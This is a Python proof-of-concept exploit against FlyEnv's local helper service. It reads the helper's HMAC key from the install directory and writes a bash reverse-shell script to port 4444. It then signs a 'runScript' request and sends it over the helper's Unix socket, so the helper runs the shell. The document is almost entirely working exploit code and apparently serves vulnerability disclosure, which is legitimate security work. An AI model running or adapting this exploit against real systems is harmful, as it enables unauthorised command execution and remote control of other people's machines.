#!/usr/bin/env python3

import hashlib, hmac, json, os, socket, time, uuid

SOCK = "/tmp/flyenv-helper.sock"
KEY  = "/usr/local/share/FlyEnv/flyenv-helper.key"
SCRIPT = os.path.expanduser("~/.config/FlyEnv/start-poc.sh") 

# payload script
open(SCRIPT, "w").write("#!/bin/bash\n/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n")
os.chmod(SCRIPT, 0o755)

# build the HMAC-signed runScript request 
key   = open(KEY, "rb").read()
args  = ["/bin/bash", SCRIPT]
aj    = json.dumps(args, separators=(",", ":"))
k, ts, nonce, pid = uuid.uuid4().hex, int(time.time() * 1000), uuid.uuid4().hex, os.getpid()
sig   = hmac.new(key, f"{k}|tools|runScript|{aj}|{ts}|{nonce}|{pid}|".encode(), hashlib.sha256).hexdigest()
req   = {"key": k, "module": "tools", "function": "runScript", "args": args,
         "ts": ts, "nonce": nonce, "clientPid": pid, "clientExe": "", "sig": sig}

# send payload
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect(SOCK)
s.sendall(json.dumps(req).encode())
resp = json.loads(s.recv(65536).decode()); s.close()
print(resp["data"]["stdout"].strip() if resp.get("code") == 0 else f"FAILED: {resp}")
